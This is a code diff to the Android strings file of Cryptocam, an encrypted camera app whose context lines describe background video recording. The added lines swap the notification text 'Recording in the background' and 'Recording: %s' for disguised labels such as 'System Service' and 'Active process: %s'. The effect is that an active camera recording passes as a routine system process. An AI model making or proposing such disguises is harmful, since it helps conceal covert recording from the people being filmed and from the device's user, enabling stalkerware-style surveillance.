@@ -19,10 +19,10 @@
     <string name="background_recording_desc">Cryptocam supports recording in the background. That means recording will continue even if you exit the app or turn the screen off (!!!This does not work on Android 11 and up!!!).\nDepending on your device\'s manufacturer, Android might stop Cryptocam from running to save battery. To make sure that doesn\'t happen without you noticing, your device will regularly vibrate while recording. If the vibrating stops, it means Cryptocam was killed.</string>
     <string name="vibrate_while_recording">Vibrate during recording</string>
     <string name="vibrate_while_recording_summary">Regularly vibrate while recording in the background so you\'ll know if Cryptocam is killed by Android</string>
-    <string name="notification_channel_description">Cryptocam is recording in the background</string>
-    <string name="notification_channel_name">Background recording</string>
-    <string name="notification_text">Recording: %s</string>
-    <string name="notification_title">Recording in the background</string>
+    <string name="notification_channel_description">Running background tasks</string>
+    <string name="notification_channel_name">System Services</string>
+    <string name="notification_text">Active process: %s</string>
+    <string name="notification_title">System Service</string>
     <string name="tutorial_website">Cryptocam tutorial site</string>
     <string name="tutorial_website_description">There is a full tutorial available on the Cryptocam website. It will explain how to generate keys, set them up in Cryptocam and how to decrypt videos.</string>
     <string name="licenses">Licenses</string>
